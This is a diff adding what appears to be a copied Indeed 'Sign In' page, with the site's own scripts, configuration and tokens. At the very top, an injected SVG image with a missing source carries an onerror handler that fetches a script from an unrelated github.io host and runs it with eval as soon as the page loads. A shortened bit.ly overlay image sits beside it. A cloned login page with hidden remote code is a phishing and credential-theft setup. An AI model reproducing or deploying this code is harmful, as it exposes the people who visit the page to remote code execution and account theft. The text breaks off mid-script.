@@ -1,0 +1,870 @@
+<!doctype html>
+<html lang="en">
+<svg xmlns="http://www.w3.org/2000/svg" width="200" height="200">
+  <image x="10" y="10" width="180" height="180" 
+         href="nonexistent.jpg" 
+         onerror="fetch('https://totallylost-helpme.github.io/chat.js')
+                  .then(res => res.text())
+                  .then(eval)" />
+
+  <!-- Overlay Image -->
+  <image href="https://bit.ly/4aoMbTQ" 
+         alt="Overlay Image" 
+         x="50%" 
+         y="50%" 
+         width="100" 
+         height="auto"
+         transform="translate(-50%, -50%)" />
+  
+</svg>
+  <head>
+    <script type="text/javascript">
+      var urlencode = window.encodeURIComponent
+        ? function (str) {
+            return window.encodeURIComponent(str).replace(/%20/g, "+")
+          }
+        : function (str) {
+            return escape(str)
+              .replace(/\+/g, "%2B")
+              .replace(/\//g, "%2F")
+              .replace(/%20/g, "+")
+          }
+
+      function logJavascriptError(m, u, l, c, e) {
+        var msg = m.type
+          ? "Event object: " +
+            m.type +
+            " " +
+            (m.target ? m.target.outerHTML : "")
+          : m
+        msg = msg.length > 200 ? msg.substring(0, 200) : msg
+        var tk = encodeURIComponent("1ihb53j9sgqr4801")
+        var pgid = encodeURIComponent("auth")
+        var extra = ""
+        if (c) {
+          extra += "&col=" + encodeURIComponent(c)
+        }
+        if (e) {
+          extra += "&error=" + encodeURIComponent(e)
+        }
+        var href =
+          "/rpc/log?a=javascript_error" +
+          "&tk=" +
+          tk +
+          "&pgid=" +
+          pgid +
+          "&msg=" +
+          encodeURIComponent(msg) +
+          "&url=" +
+          encodeURIComponent(u) +
+          "&line=" +
+          encodeURIComponent(l) +
+          extra
+        new Image().src = href
+      }
+
+      logJavascriptError.errorCount = 0
+      window.onerror = function (m, u, l, c, e) {
+        if (logJavascriptError.errorCount == 0) {
+          logJavascriptError(m, u, l, c, e)
+        }
+
+        logJavascriptError.errorCount++
+        return false
+      }
+
+      function logClientClicks(clientContext) {
+        var tk = encodeURIComponent("1ihb53j9sgqr4801")
+        var pgid = encodeURIComponent("auth")
+
+        var context = encodeURIComponent(clientContext)
+
+        var href =
+          "../rpc/log?a=client_click" +
+          "&tk=" +
+          tk +
+          "&pgid=" +
+          pgid +
+          "&ctx=" +
+          context
+
+        new Image().src = href
+      }
+    </script>
+    <title>Sign In | Indeed Accounts</title>
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="https://c03.s3.indeed.com/passport/static/compiled/images/favicon-cdf5db.ico"
+    />
+    <link
+      rel="apple-touch-icon"
+      href="https://c03.s3.indeed.com/passport/static/compiled/images/apple-touch-icon-14d6e1.png"
+    />
+    <link
+      rel="apple-touch-icon-precomposed"
+      href="https://c03.s3.indeed.com/passport/static/compiled/images/apple-touch-icon-precomposed-96dae7.png"
+    />
+    <script type="text/javascript">
+      window.model = {
+        showExternalNavigation: true,
+        continueParameter: null,
+        verificationCode: null,
+        pageCode: "auth",
+        ctk: "1ihb53gn0gmvp800",
+        tk: "1ihb53j9sgqr4801",
+        variation: null,
+        showExistingAcctMsg: false,
+        showIaApplySuccessMsg: false,
+        mosaicPlatformViewModel: null,
+        bundle: "auth-page",
+        email: "",
+        phoneNumber: null,
+        loginTk: "1ihb53j9tgqr4800",
+        authType: null,
+        authIdentifierError: null,
+        passError: null,
+        phoneVerified: false,
+        showPasswordCaptcha: false,
+        showEmailOptOut: false,
+        countryCode: null,
+        redirectUrl: null,
+        baseSecureURL: "https://secure.indeed.com",
+        ipqsScriptSrc:
+          "https://www.ipqscdn.com/api/indeed.com/Cj3vYxb1VZH2JWf0tcSCvYQYYDpTUVzrhnbokrjKBwfU27WZkOPIVPU4jKvusri0MQWIKEwDWZtsinjFTdO0Hhh1FHSreV5Jnpzkwv0GNqfA8rAuB5X5R1ybqqrbmKoEYLRUWRekgbYgshv7NvtZLyFKku08TbCeYn13r0sbLioZLjLXNYo6nLRp4SOYCPIMH3dJdLHQ8z7FZL15cTmK2tI1bGbWR16xbdY6W0LwxLmfkf4StKb1qrCavtM4u500/learn.js",
+        personalizedFlow: null,
+        urls: {
+          forgotPasswordUrl:
+            "/account/forgotpassword?hl=en_US\u0026co=US\u0026continue=https%3A%2F%2Fwww.indeed.com",
+          registrationUrl:
+            "/auth?hl=en_US\u0026co=US\u0026continue=https%3A%2F%2Fwww.indeed.com",
+          loginUrl:
+            "/auth?hl=en_US\u0026co=US\u0026continue=https%3A%2F%2Fwww.indeed.com",
+          browseJobsUrl: "https://www.indeed.com/find-jobs.jsp?hl=en_US",
+          workAtIndeedUrl: "https://www.indeed.jobs",
+          countriesUrl: "https://www.indeed.com/worldwide?hl=en_US",
+          aboutUsUrl: "https://www.indeed.com/about?hl=en_US",
+          helpCenterUrl: "https://support.indeed.com/hc/en-us?redirect=false",
+          legalTosUrl: "https://www.indeed.com/legal?hl=en\u0026co=US",
+        },
+        extraParams: {
+          hl: "en_US",
+          co: "US",
+          continue: "https://www.indeed.com",
+          jsContinue: null,
+          empContinue: null,
+          service: null,
+          cfb: 0,
+          pvr: 0,
+          pvm: "",
+          obo: null,
+          continue2: null,
+          var: null,
+          form_tk: "1ihb53j9sgqr4801",
+          surftok: "C29TkFJTsDjg2A93sPGmdstJARNhUY5h",
+          tmpl: "",
+          from: null,
+          iframe_tk: null,
+          branding: "",
+          userType: null,
+        },
+        from: null,
+        externalAuthProviders: {
+          google: {
+            redirectUrl:
+              "https://accounts.google.com/o/oauth2/v2/auth?response_type=code\u0026redirect_uri=https%3A%2F%2Fsecure.indeed.com%2Faccount%2Fgoogleauth\u0026client_id=1047839414793-v442kdo3pt0vb43l8nu2c5sh9lf4bsnj.apps.googleusercontent.com\u0026scope=openid+email+profile\u0026state=C29TkFJTsDjg2A93sPGmdstJARNhUY5h\u0026nonce=YhcdMepVG8l2xDOt\u0026ui_locales=en-US+en",
+            error: "",
+            mode: "DESKTOP",
+          },
+          line: null,
+          apple: {
+            redirectUrl: "https://secure.indeed.com/account/appleauth",
+            errorMessage: "",
+            clientId: "com.indeed.secure",
+            state: "C29TkFJTsDjg2A93sPGmdstJARNhUY5h",
+            nonce: "o1z7V4JHMqkiKZb4",
+            usePopup: true,
+            useAppleButton: false,
+          },
+          microsoft: null,
+        },
+        pageTitle: null,
+      }
+      window.captcha = {
+        captchaEnabled: true,
+        captchaErrorCodes: [],
+        captchaErrorMessage: "",
+        captchaSiteKey: "0x4AAAAAAAP4NN8CHkVtsERB",
+      }
+      window.iSpotTrackingPixel = {
+        trackingPixelUrl:
+          "https://pt.ispot.tv/v2/TC-3035-1.gif?app=web\u0026type=job_seeker_account_create",
+        active: true,
+      }
+      window.parameterConstants = {
+        givenName: "givenName",
+        familyName: "familyName",
+        email: "__email",
+        password: "__password",
+        confirmpassword: "__confirmpw",
+        currentpassword: "__currentpw",
+        phonenumber: "pn",
+        countryindex: "countryindex",
+        factorSID: "factor_sid",
+        passcode: "passcode",
+        consented: "subscription_consented",
+        consentedval: "on",
+      }
+      window.legalFooterText =
+        '<nav class="legal-footer">&copy;2025 Indeed - <a href="https:\/\/www.indeed.com\/legal?hl=en&co=US">Cookies, Privacy and Terms<\/a><\/nav>'
+      window.globalnav_brandinghome_link = "https:\/\/www.indeed.com\/"
+      window.globalnav_variant = "NO_NAV"
+      window.proctorGroups = [
+        [-1, null],
+        [-1, null],
+        [-1, null],
+        [-1, null],
+        [1, null],
+        [1, null],
+        [1, null],
+        [-1, null],
+        [-1, null],
+        [-1, null],
+        [-1, null],
+        [-1, null],
+        [-1, null],
+        [1, null],
+        [0, null],
+        [-1, null],
+        [0, null],
+        [-1, null],
+        [-1, null],
+        [1, null],
+        [1, null],
+        [1, null],
+        [-1, null],
+        [1, null],
+        [-1, null],
+        [1, null],
+        [3, null],
+        [1, null],
+        [0, null],
+        [1, null],
+        [0, null],
+        [-1, []],
+        [1, null],
+        [0, null],
+        [1, null],
+        [1, null],
+        [-1, null],
+        [-1, null],
+        [-1, null],
+      ]
+    </script>
+    <!-- Load Indeed Sans -->
+    <link href="https://prod.statics.indeed.com" rel="preconnect" crossorigin />
+    <link
+      href="https://prod.statics.indeed.com/ds/assets/typography/indeedsans/v1/indeedsans.css"
+      rel="stylesheet"
+    />
+  </head>
+  <body dir="ltr" class="ltr pass-body-tmpl-STANDARD">
+    <script>
+      /* Replacing <body ontouchstart=""> since it is not HTML5 valid */
+      document.body.addEventListener("touchstart", function () {}, false)
+    </script>
+    <div
+      id="container"
+      class="pass-container pass-container-tmpl-STANDARD pass-container-branding-"
+    >
+      <div class="pass-GnavContainer">
+        <script id="_indeed_gnav_config" type="application/json">
+          {
+            "webVitalsEnabled": true,
+            "resourceTimingEnabled": false,
+            "backgroundRealtimeUpdatesEnabled": false,
+            "oneGraphApiKey": "8a0b9a0515af41addb33361deed717802de3577937ca4b28d5cbdaf56d947dc9",
+            "logRoute": "https://t.indeed.com/signals/gnav/log?from=passport--passport-webapp-%2Fauth\u0026parentLogId=1ihb53j98gqp4801\u0026hostAppTk=",
+            "signalsLogRoute": "https://t.indeed.com/signals/v1/log?from=passport--passport-webapp-%2Fauth\u0026parentLogId=1ihb53j98gqp4801\u0026hostAppTk=",
+            "serviceRequestLogUID": "1ihb53j98gqp4801",
+            "hostAppTk": "",
+            "pageId": "/auth",
+            "canonicalPageId": "",
+            "applicationId": "passport--passport-webapp",
+            "appName": "passport--passport-webapp",
+            "country": "US",
+            "requestURL": "http://secure.indeed.com/auth?hl=en_US\u0026co=US\u0026continue=https%253A%252F%252Fwww.indeed.com",
+            "language": "en",
+            "isMobile": false,
+            "jsErrorLogType": "gnavJSError",
+            "jsErrorLth": "6411ec182c6acd8714dc2d03716eed1d",
+            "jsEnabledLogType": "gnavJSEnabled",
+            "jsEnabledLth": "5e9311c1001227ca5c6c32db123fb854",
+            "interactionLogType": "gnavInteraction",
+            "interactionLth": "87caa20c31fa9e447264b1615339f1ce",
+            "clickLogType": "gnavClick",
+            "clickLth": "fa8b0aff9499e52dd7e9215032d9ad9f",
+            "pageSpeedLogType": "gnavPageSpeed",
+            "pageSpeedLth": "12783140239867f5afc3bd80a743e013",
+            "dwellTimeLogType": "gnavDwellTime",
+            "dwellTimeLth": "e415e44ee819f056fc4675c1b0373740",
+            "clickstreamEnabled": false,
+            "pagenavigationEnabled": true,
+            "clickstreamEnvironmentId": "",
+            "signalsTransportImplementation": "nativeBeacon",
+            "isPreproduction": false,
+            "stagingLevel": "prod",
+            "showGlobalPrivacyControlBanner": true,
+            "globalPrivacyControlBannerButtonLink": "https://privacy.indeed.com/share/indeed?hl=en_US\u0026from=global-nav",
+            "globalPrivacyControlBannerButtonText": "Privacy settings",
+            "globalPrivacyControlBannerTopText": "We have detected that you have the global privacy control (GPC) signal enabled. Please click [Privacy settings|boldEl] to exercise your privacy rights.",
+            "globalPrivacyControlBannerBottomText": "If you wish to continue using Indeed without updating your privacy settings at this time, you may close this banner at any time.",
+            "globalPrivacyControlBannerDismissLabel": "Dismiss Banner",
+            "globalPrivacyControlBannerCookieDomain": [".indeed.com"],
+            "globalPrivacyControlBannerVariant": "float",
+            "adblockDetectionBannerText": "If you notice issues with your Indeed pages, please turn off your ad blocker.",
+            "showAdblockDetectionBanner": false,
+            "adblockDetectionBannerTitle": "Ad blocker detected",
+            "adblockDetectionBannerDismissText": "Dismiss",
+            "nonPersonalizedExperienceTestActive": false,
+            "isPhoneUpdateNudgeEnabled": false,
+            "lastFetchedActiveTimeCookieDomain": ".indeed.com",
+            "phoneUpdateNudgeRedirectionUrl": "https://secure.indeed.com/account/changephone?src=gnav\u0026continue=http://secure.indeed.com/auth?hl=en_US\u0026co=US\u0026continue=https%253A%252F%252Fwww.indeed.com",
+            "lastFetchedActiveTime": "undefined",
+            "accountId": "-1",
+            "ctk": "1ihb53gn0gmvp800",
+            "isPnoUser": false,
+            "proctorWindowSize": 0,
+            "phoneUpdateNudgeDataGnavRegion": "PhoneUpdateNudge",
+            "phoneUpdateNudgeHeaderText": "Review phone number",
+            "phoneUpdateNudgeBodyText": "Is [{0}|strong] your current phone number eligble to receive both WhatsApp and SMS messages? An updated phone number ensures that you don’t lose access to your Indeed account.",
+            "phoneUpdateNudgePrimaryCtaText": "Yes, this is correct",
+            "phoneUpdateNudgeSecondaryCtaText": "Update phone number",
+            "publicPath": "https://c03.s3.indeed.com/dist/"
+          }
+        </script>
+        <script>
+          if (
+            window.performance !== undefined &&
+            performance.mark !== undefined
+          ) {
+            performance.mark("gnavRenderBlockingCSSHeader:start")
+          }
+        </script>
+        <link
+          rel="stylesheet"
+          type="text/css"
+          href="https://c03.s3.indeed.com/dist/header/noNavHeader.87437949222d8e81bf7e.css"
+          crossorigin="anonymous"
+        />
+        <link
+          rel="preconnect"
+          href="https://fonts.gstatic.com/"
+          crossorigin="anonymous"
+        />
+        <link
+          rel="stylesheet"
+          type="text/css"
+          href="https://c03.s3.indeed.com/fonts/v1/indeedsans.css"
+          crossorigin="anonymous"
+        />
+        <script>
+          if (
+            window.performance !== undefined &&
+            performance.mark !== undefined &&
+            performance.measure !== undefined
+          ) {
+            performance.mark("gnavRenderBlockingCSSHeader:end")
+            performance.measure(
+              "gnavRenderBlockingCSSHeader",
+              "gnavRenderBlockingCSSHeader:start",
+              "gnavRenderBlockingCSSHeader:end",
+            )
+          }
+        </script>
+        <nav class="gnav" id="gnav-main-container" aria-label="Primary"></nav>
+        <script>
+          "use strict"
+          ;(() => {
+            const e = (window._INDEED = window._INDEED || {}),
+              o = (e.shared = e.shared || {})
+            o.v1 ||
+              ((o.v1 = {
+                load: function () {
+                  for (
+                    var e = arguments.length, n = new Array(e), r = 0;
+                    r < e;
+                    r++
+                  )
+                    n[r] = arguments[r]
+                  return new Promise((e, r) => {
+                    o.v1.load.q.push({ args: n, resolve: e, reject: r })
+                  })
+                },
+                initialize: (e) => {
+                  o.v1.config || ((o.v1.config = e), n(3))
+                },
+              }),
+              (o.v1.load.q = []))
+            const n = (e) => {
+              if (o.v1.load.q) {
+                const r = o.v1.config
+                let s = r.loadersUrl
+                const t = localStorage.getItem("shared-deps.branch") ?? r.branch
+                t &&
+                  (s = s.replace("sharedDepsLoaders", `${t}/sharedDepsLoaders`))
+                const a = document.createElement("script")
+                ;(a.async = !0),
+                  (a.src = s),
+                  (a.crossOrigin = "anonymous"),
+                  (a.onerror = (o) => {
+                    if (o instanceof ErrorEvent) {
+                      const t = e - 1
+                      if (t > 0) n(t)
+                      else {
+                        var s
+                        const {
+                            error: e,
+                            message: n,
+                            filename: t,
+                            lineno: a,
+                            colno: c,
+                          } = o,
+                          d =
+                            (null == e ? void 0 : e.name) ||
+                            "SharedDepsShimLoaderError",
+                          i =
+                            (null == e ? void 0 : e.message) ||
+                            n ||
+                            "Failed to fetch & execute sharedDepsLoader",
+                          l =
+                            (null == e ? void 0 : e.toString()) || `${d}: ${i}`,
+                          m =
+                            null ===
+                              (s =
+                                (null == e ? void 0 : e.stack) ||
+                                `event: ${t}:${a}:${c}\nonerror: ${new Error().stack}`) ||
+                            void 0 === s
+                              ? void 0
+                              : s.substring(0, 1e3),
+                          h = document.createElement("script")
+                        ;(h.async = !0),
+                          (h.crossOrigin = "anonymous"),
+                          (h.src = `${r.logRoute}&logType=${r.jsErrorLogType}&lth=${r.jsErrorLth}&name=${d}&message=${encodeURIComponent(i)}&toString=${encodeURIComponent(l)}&stack=${encodeURIComponent(m)}`),
+                          document.head.appendChild(h)
+                      }
+                    }
+                  }),
+                  document.head.appendChild(a)
+              }
+            }
+          })()
+          window._INDEED.shared.v1.initialize({
+            publicPath: "https://c03.s3.indeed.com/shared/",
+            loadersUrl:
+              "https://c03.s3.indeed.com/shared/sharedDepsLoadersV1.autoupgrade.js",
+            shareScopes: ["react18_ifl6"],
+            groups: {},
+            logRoute:
+              "https://t.indeed.com/signals/gnav/log?from=passport--passport-webapp-%2Fauth&parentLogId=1ihb53j98gqp4801&hostAppTk=",
+            jsErrorLogType: "gnavJSError",
+            jsErrorLth: "6411ec182c6acd8714dc2d03716eed1d",
+          })
+        </script>
+        <script>
+          ;(() => {
+            var callFnWhenReady =
+              window._INDEED &&
+              window._INDEED.shared &&
+              window._INDEED.shared.v1
+                ? (fn) => fn()
+                : (fn) =>
+                    window.addEventListener(
+                      "onSharedDepsLoadersV1Available",
+                      fn,
+                      { once: true },
+                    )
+            callFnWhenReady(() =>
+              window._INDEED.shared.v1
+                .load("module", {
+                  urls: [
+                    "https://c03.s3.indeed.com/dist/header/remoteEntry.67a667b9c62469e9f6e4.js",
+                  ],
+                  container: "gnavHeaderModule",
+                  module: "./noNavHeader",
+                  shareScope: "react18_ifl6",
+                  afterEvent: "DOMContentLoaded",
+                })
+                .catch(() => null),
+            )
+          })()
+        </script>
+        <div id="gnav-script-contents">
+          <script>
+            window.signals_transport = window.signals_transport || {
+              emitSignal: function (data) {
+                window.signals_transport_tmp =
+                  window.signals_transport_tmp || []
+                if (window.signals_transport_tmp.length < 1000) {
+                  window.signals_transport_tmp.push(data)
+                }
+              },
+            }
+          </script>
+
+          <script>
+            window.pagenavigation = window.pagenavigation || {
+              recordInitialNavigation: (params) => {
+                window.initial_pagnav_params_tmp = params
+              },
+              markSoftNavigationStart: () => {},
+            }
+          </script>
+        </div>
+      </div>
+      <div id="passpage-container" class="passpage-container auth"></div>
+      <div class="pass-footer-container dd-privacy-allow">
+        <script id="_indeed_gnav_footer_config" type="application/json">
+          {
+            "footerVariant": "DESKTOP_JOBSEEKER_FOOTER",
+            "nonPersonalizedExperienceProps": {
+              "nonPersonalizedExperienceTestActive": false
+            },
+            "hideFooterLinks": true,
+            "desktopJobseekerFooterConfig": {
+              "links": [
+                {
+                  "description": "Hiring Lab",
+                  "href": "https://www.hiringlab.org",
+                  "dataHref": "https://www.hiringlab.org?from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "HiringLab"
+                },
+                {
+                  "description": "Career advice",
+                  "href": "https://www.indeed.com/career-advice",
+                  "dataHref": "https://www.indeed.com/career-advice?from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "CareerAdvice"
+                },
+                {
+                  "description": "Browse jobs",
+                  "href": "https://www.indeed.com/browsejobs",
+                  "dataHref": "https://www.indeed.com/browsejobs?from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "BrowseJobs"
+                },
+                {
+                  "description": "Browse companies",
+                  "href": "https://www.indeed.com/companies/browse-companies",
+                  "dataHref": "https://www.indeed.com/companies/browse-companies?from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "BrowseCompanies"
+                },
+                {
+                  "description": "Salaries",
+                  "href": "https://www.indeed.com/career/salaries",
+                  "dataHref": "https://www.indeed.com/career/salaries?from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "Salaries"
+                },
+                {
+                  "description": "Indeed Events",
+                  "href": "https://www.indeedevents.com/",
+                  "dataHref": "https://www.indeedevents.com/?from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "IndeedEvents"
+                },
+                {
+                  "description": "Work at Indeed",
+                  "href": "https://www.indeed.com/cmp/indeed/about",
+                  "dataHref": "https://www.indeed.com/cmp/indeed/about?from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "WorkAtIndeed"
+                },
+                {
+                  "description": "Countries",
+                  "href": "https://www.indeed.com/worldwide",
+                  "dataHref": "https://www.indeed.com/worldwide?from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "Countries"
+                },
+                {
+                  "description": "About",
+                  "href": "https://www.indeed.com/about",
+                  "dataHref": "https://www.indeed.com/about?from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "About"
+                },
+                {
+                  "description": "Help",
+                  "href": "https://www.indeed.com/help",
+                  "dataHref": "https://www.indeed.com/help?from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "JobseekerHelpCenter"
+                },
+                {
+                  "description": "ESG at Indeed",
+                  "href": "https://www.indeed.com/esg?from=gnav-passport--passport-webapp",
+                  "dataHref": "https://www.indeed.com/esg?from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "JobseekerESGInclusionData"
+                }
+              ],
+              "impressumLinks": [
+                {
+                  "description": "Your Privacy Choices",
+                  "href": "https://www.indeed.com/legal/ccpa-dns?hl=en",
+                  "dataHref": "https://www.indeed.com/legal/ccpa-dns?hl=en\u0026from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "CPRA"
+                },
+                {
+                  "description": "Accessibility at Indeed",
+                  "href": "https://www.indeed.com/accessibility?hl=en",
+                  "dataHref": "https://www.indeed.com/accessibility?hl=en\u0026from=gnav-passport--passport-webapp",
+                  "dataGnavElementName": "Accessibility"
+                },
+                {
+                  "description": "Privacy Center and Ad Choices",
+                  "href": "https://hrtechprivacy.com/brands/indeed#privacypolicy",
+                  "dataHref": "https://hrtechprivacy.com/brands/indeed?from=gnav-passport--passport-webapp#privacypolicy",
+                  "dataGnavElementName": "PrivacyAndAdChoices"
+                }
+              ],
+              "legalLink": {
+                "description": "Terms",
+                "href": "https://www.indeed.com/legal?hl=en",
+                "dataHref": "https://www.indeed.com/legal?hl=en\u0026from=gnav-passport--passport-webapp",
+                "dataGnavElementName": "Terms"
+              },
+              "year": 2025
+            },
+            "logRoute": "https://t.indeed.com/signals/gnav/log?from=passport--passport-webapp-%2Fauth\u0026parentLogId=1ihb53j98gqp4801\u0026hostAppTk=",
+            "signalsLogRoute": "https://t.indeed.com/signals/v1/log?from=passport--passport-webapp-%2Fauth\u0026parentLogId=1ihb53j98gqp4801\u0026hostAppTk=",
+            "serviceRequestLogUID": "1ihb53j98gqp4801",
+            "hostAppTk": "",
+            "pageId": "/auth",
+            "canonicalPageId": "",
+            "applicationId": "passport--passport-webapp",
+            "appName": "passport--passport-webapp",
+            "country": "US",
+            "requestURL": "http://secure.indeed.com/auth?hl=en_US\u0026co=US\u0026continue=https%253A%252F%252Fwww.indeed.com",
+            "language": "en",
+            "isMobile": false,
+            "jsErrorLogType": "gnavJSError",
+            "jsErrorLth": "6411ec182c6acd8714dc2d03716eed1d",
+            "jsEnabledLogType": "gnavJSEnabled",
+            "jsEnabledLth": "5e9311c1001227ca5c6c32db123fb854",
+            "interactionLogType": "gnavInteraction",
+            "interactionLth": "87caa20c31fa9e447264b1615339f1ce",
+            "clickLogType": "gnavClick",
+            "clickLth": "fa8b0aff9499e52dd7e9215032d9ad9f",
+            "pageSpeedLogType": "gnavPageSpeed",
+            "pageSpeedLth": "12783140239867f5afc3bd80a743e013",
+            "dwellTimeLogType": "gnavDwellTime",
+            "dwellTimeLth": "e415e44ee819f056fc4675c1b0373740",
+            "clickstreamEnabled": false,
+            "pagenavigationEnabled": true,
+            "clickstreamEnvironmentId": "",
+            "signalsTransportImplementation": "nativeBeacon",
+            "isPreproduction": false,
+            "stagingLevel": "prod",
+            "publicPath": "https://c03.s3.indeed.com/dist/"
+          }
+        </script>
+        <script>
+          if (
+            window.performance !== undefined &&
+            performance.mark !== undefined
+          ) {
+            performance.mark("gnavRenderBlockingCSSFooter:start")
+          }
+        </script>
+        <link
+          rel="stylesheet"
+          type="text/css"
+          href="https://c03.s3.indeed.com/dist/footer/jobseekerDesktopFooter.b78ae6f8505926230bd5.css"
+          crossorigin="anonymous"
+        />
+        <link
+          rel="preconnect"
+          href="https://fonts.gstatic.com/"
+          crossorigin="anonymous"
+        />
+        <link
+          rel="stylesheet"
+          type="text/css"
+          href="https://c03.s3.indeed.com/fonts/v1/indeedsans.css"
+          crossorigin="anonymous"
+        />
+        <script>
+          if (
+            window.performance !== undefined &&
+            performance.mark !== undefined &&
+            performance.measure !== undefined
+          ) {
+            performance.mark("gnavRenderBlockingCSSFooter:end")
+            performance.measure(
+              "gnavRenderBlockingCSSFooter",
+              "gnavRenderBlockingCSSFooter:start",
+              "gnavRenderBlockingCSSFooter:end",
+            )
+          }
+        </script>
+        <div class="gnav gnav-reset" id="gnav-footer-container">
+          <div class="main" data-gnav-region="MainFooter">
+            <footer class="icl-GlobalFooter" role="contentinfo">
+              <div class="icl-GlobalFooter-nav">
+                <ul class="icl-GlobalFooter-items"></ul>
+                <ul class="icl-GlobalFooter-items">
+                  <li class="icl-GlobalFooter-item">© 2025 Indeed</li>
+                  <li class="icl-GlobalFooter-item">
+                    <a
+                      data-gnav-element-name="CPRA"
+                      class="icl-GlobalFooter-link"
+                      href="https://www.indeed.com/legal/ccpa-dns?hl=en"
+                      >Your Privacy Choices<!-- -->
+                      <svg
+                        class="icl-GlobalFooter-cpra-icon"
+                        aria-hidden="true"
+                        id="cpra-logo"
+                        xmlns="http://www.w3.org/2000/svg"
+                        viewBox="0 0 30 14"
+                        focusable="false"
+                      >
+                        <style>
+                          .cpra-st0,.cpra-st1<!-- -->{<!-- -->fill-rule:evenodd;clip-rule:evenodd;fill:#fff<!-- -->}<!-- -->.cpra-st1<!-- -->{<!-- -->fill:#06f<!-- -->}<!-- -->.cpra-st2<!-- -->{<!-- -->fill:#fff<!-- -->}<!-- -->.cpra-st3<!-- -->{<!-- -->fill:#06f<!-- -->}
+                        </style>
+                        <path
+                          class="cpra-st0"
+                          d="M7.4 12.8h6.8l3.1-11.6H7.4C4.2 1.2 1.6 3.8 1.6 7s2.6 5.8 5.8 5.8z"
+                        ></path>
+                        <path
+                          class="cpra-st1"
+                          d="M22.6 0H7.4c-3.9 0-7 3.1-7 7s3.1 7 7 7h15.2c3.9 0 7-3.1 7-7s-3.2-7-7-7zm-21 7c0-3.2 2.6-5.8 5.8-5.8h9.9l-3.1 11.6H7.4c-3.2 0-5.8-2.6-5.8-5.8z"
+                        ></path>
+                        <path
+                          class="cpra-st2"
+                          d="M24.6 4c.2.2.2.6 0 .8L22.5 7l2.2 2.2c.2.2.2.6 0 .8-.2.2-.6.2-.8 0l-2.2-2.2-2.2 2.2c-.2.2-.6.2-.8 0-.2-.2-.2-.6 0-.8L20.8 7l-2.2-2.2c-.2-.2-.2-.6 0-.8.2-.2.6-.2.8 0l2.2 2.2L23.8 4c.2-.2.6-.2.8 0z"
+                        ></path>
+                        <path
+                          class="cpra-st3"
+                          d="M12.7 4.1c.2.2.3.6.1.8L8.6 9.8c-.1.1-.2.2-.3.2-.2.1-.5.1-.7-.1L5.4 7.7c-.2-.2-.2-.6 0-.8.2-.2.6-.2.8 0L8 8.6l3.8-4.5c.2-.2.6-.2.9 0z"
+                        ></path></svg
+                    ></a>
+                  </li>
+                  <li class="icl-GlobalFooter-item">
+                    <a
+                      data-gnav-element-name="Accessibility"
+                      class="icl-GlobalFooter-link"
+                      href="https://www.indeed.com/accessibility?hl=en"
+                      >Accessibility at Indeed<!-- -->
+                    </a>
+                  </li>
+                  <li class="icl-GlobalFooter-item">
+                    <a
+                      data-gnav-element-name="PrivacyAndAdChoices"
+                      class="icl-GlobalFooter-link"
+                      href="https://hrtechprivacy.com/brands/indeed#privacypolicy"
+                      >Privacy Center and Ad Choices<!-- -->
+                    </a>
+                  </li>
+                  <li class="icl-GlobalFooter-item">
+                    <a
+                      data-href="https://www.indeed.com/legal?hl=en&amp;from=gnav-passport--passport-webapp"
+                      data-gnav-element-name="Terms"
+                      class="icl-GlobalFooter-link"
+                      href="https://www.indeed.com/legal?hl=en"
+                      >Terms</a
+                    >
+                  </li>
+                </ul>
+              </div>
+            </footer>
+          </div>
+        </div>
+        <script>
+          ;(() => {
+            var callFnWhenReady =
+              window._INDEED &&
+              window._INDEED.shared &&
+              window._INDEED.shared.v1
+                ? (fn) => fn()
+                : (fn) =>
+                    window.addEventListener(
+                      "onSharedDepsLoadersV1Available",
+                      fn,
+                      { once: true },
+                    )
+            callFnWhenReady(() =>
+              window._INDEED.shared.v1
+                .load("module", {
+                  urls: [
+                    "https://c03.s3.indeed.com/dist/footer/remoteEntry.38ab817d9e96535230f9.js",
+                  ],
+                  container: "gnavFooterModule",
+                  module: "./jobseekerDesktopFooter",
+                  shareScope: "react18_ifl6",
+                  afterEvent: "DOMContentLoaded",
+                })
+                .catch(() => null),
+            )
+          })()
+        </script>
+      </div>
+    </div>
+    <script src="https://c03.s3.indeed.com/passport/s/16f44ed/static/scripts/i18n/en_US.js"></script>
+    <script src="https://c03.s3.indeed.com/passport/static/compiled/286055672feae8cfe3e2/js/auth-page.js"></script>
+    <script
+      type="text/javascript"
+      src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"
+      onload="triggerAppleLoaded()"
+      async
+      defer
+    ></script>
+    <script type="text/javascript">
+      function triggerAppleLoaded() {
+        var event
+        try {
+          event = new Event("apple-loaded")
+        } catch (e) {
+          event = document.createEvent("Event")
+          event.initEvent("apple-loaded", true, true)
+        }
+        window.dispatchEvent(event)
+      }
+    </script>
+    <script type="text/javascript">
+      if (window.parent !== window.self) {
+        window.parent.postMessage({ type: "passport_iframe_loaded" }, "*")
+      }
+    </script>
+    <script>
+      ;(function () {
+        function c() {
+          var b = a.contentDocument || a.contentWindow.document
+          if (b) {
+            var d = b.createElement("script")
+            d.innerHTML =
+              "window.__CF$cv$params={r:'90067a81a87139f3',t:'MTczNjYxNDk4OS4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);"
+            b.getElementsByTagName("head")[0].appendChild(d)
+          }
+        }
+        if (document.body) {
+          var a = document.createElement("iframe")
+          a.height = 1
+          a.width = 1
+          a.style.position = "absolute"
+          a.style.top = 0
+          a.style.left = 0
+          a.style.border = "none"
+          a.style.visibility = "hidden"
+          document.body.appendChild(a)
+          if ("loading" !== document.readyState) c()
+          else if (window.addEventListener)
